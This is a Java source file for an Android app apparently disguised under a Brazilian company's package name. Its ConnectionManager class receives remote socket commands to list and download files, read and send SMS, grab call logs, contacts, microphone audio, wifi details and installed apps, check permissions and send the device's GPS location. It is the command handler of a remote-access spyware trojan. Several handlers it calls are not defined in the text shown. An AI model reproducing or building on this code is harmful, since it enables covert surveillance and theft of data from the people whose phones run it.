package br.com.assessoriarealeza.irp;

import android.content.Context;
import android.os.Looper;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import io.socket.emitter.Emitter;

public class ConnectionManager {

    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();

    public static void startAsync(Context con) {
        try {
            context = con;
            sendReq();
        } catch (Exception ex) {
            startAsync(con);
        }
    }

    public static void sendReq() {
        try {
            if(ioSocket != null)
                return;
            ioSocket = IOSocket.getInstance().getIoSocket();
            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("type");

                        switch (order){
//                            case "0xCA":
//                                if(data.getString("action").equals("camList"))
//                                    CA(-1);
//                                else if (data.getString("action").equals("takePic"))
//                                    CA(Integer.parseInt(data.getString("cameraID")));
//                                break;
                            case "0xFI":
                                if (data.getString("action").equals("ls"))
                                    FI(0,data.getString("path"));
                                else if (data.getString("action").equals("dl"))
                                    FI(1,data.getString("path"));
                                break;
                            case "0xSM":
                                if(data.getString("action").equals("ls"))
                                    SM(0,null,null);
                                else if(data.getString("action").equals("sendSMS"))
                                    SM(1,data.getString("to") , data.getString("sms"));
                                break;
                            case "0xCL":
                                CL();
                                break;
                            case "0xCO":
                                CO();
                                break;
                            case "0xMI":
                                MI(data.getInt("sec"));
                                break;
                            case "0xLO":
                                LO();
                                break;
                            case "0xWI":
                                WI();
                                break;
                            case "0xPM":
                                PM();
                                break;
                            case "0xIN":
                                IN();
                                break;
                            case "0xGP":
                                GP(data.getString("permission"));
                                break;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();
        } catch (Exception ex) {
            Log.e("error", ex.getMessage());
        }
    }


//    public static void CA(int cameraID){
//        if(cameraID == -1) {
//           JSONObject cameraList = new CameraManager(context).findCameraList();
//            if(cameraList != null)
//            ioSocket.emit("0xCA" ,cameraList );
//        } else {
//            new CameraManager(context).startUp(cameraID);
//        }
//    }

    public static void GP(String perm) {
        JSONObject data = new JSONObject();
        try {
            data.put("permission", perm);
            data.put("isAllowed", PermissionManager.canIUse(perm));
            ioSocket.emit("0xGP", data);
        } catch (JSONException e) {

        }
    }

    public static void LO() throws Exception{
        Looper.prepare();
        LocManager gps = new LocManager(context);
        // check if GPS enabled
        if(gps.canGetLocation()){
            ioSocket.emit("0xLO", gps.getData());
        }
    }
}
